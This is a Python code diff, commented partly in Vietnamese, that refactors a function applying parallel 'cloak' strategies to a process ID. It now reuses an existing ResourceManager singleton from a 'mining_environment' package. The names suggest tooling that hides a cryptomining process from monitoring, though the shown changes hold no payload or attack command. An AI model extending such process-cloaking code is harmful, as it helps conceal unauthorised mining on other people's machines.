@@ -436,10 +436,9 @@ def apply_parallel_strategies(pid: int,
     logger.info(f"🎯 **Starting parallel strategy application** "
                f"(bắt đầu áp dụng chiến lược song song) for PID {pid}")
     
-    # Import strategy modules
+    # Import strategy modules (không khởi tạo ResourceManager tại đây)
     try:
         from .cloak_strategies import StrategyEngine, CloakRequest
-        from resource_control import ResourceManager
     except ImportError as e:
         logger.error(f"❌ Failed to import required modules: {e}")
         return {'error': str(e)}
@@ -454,14 +453,13 @@ def apply_parallel_strategies(pid: int,
     
     # Initialize strategy engine
     strategy_engine = StrategyEngine()
-    resource_manager = ResourceManager()
     
     # Create tasks for each strategy
     tasks = []
     
     for strategy_name in strategies:
         # Create closure for strategy execution
-        def execute_strategy(name=strategy_name, engine=strategy_engine, rm=resource_manager):
+        def execute_strategy(name=strategy_name, engine=strategy_engine):
             """Execute a single strategy"""
             request = CloakRequest(
                 pid=pid,
@@ -474,8 +472,18 @@ def apply_parallel_strategies(pid: int,
             
             # Apply through resource manager if GPU strategy
             if name == 'gpu' and result.success:
-                rm_result = rm.manage_resources(pid, {'strategy': name})
-                result.metadata['resource_manager'] = rm_result
+                try:
+                    # Dùng ResourceManager hiện có thay vì khởi tạo mới
+                    from mining_environment.scripts.resource_manager import ResourceManager as RMClass
+                    rm_inst = RMClass._instance
+                    if rm_inst and hasattr(rm_inst, 'manage_resources'):
+                        rm_result = rm_inst.manage_resources(pid, {'strategy': name})
+                        # Đảm bảo metadata tồn tại
+                        if not hasattr(result, 'metadata') or result.metadata is None:
+                            result.metadata = {}
+                        result.metadata['resource_manager'] = rm_result
+                except Exception as _rm_err:
+                    logger.debug(f"[ParallelExec] RM manage_resources skipped: {_rm_err}")
             
             return result
         
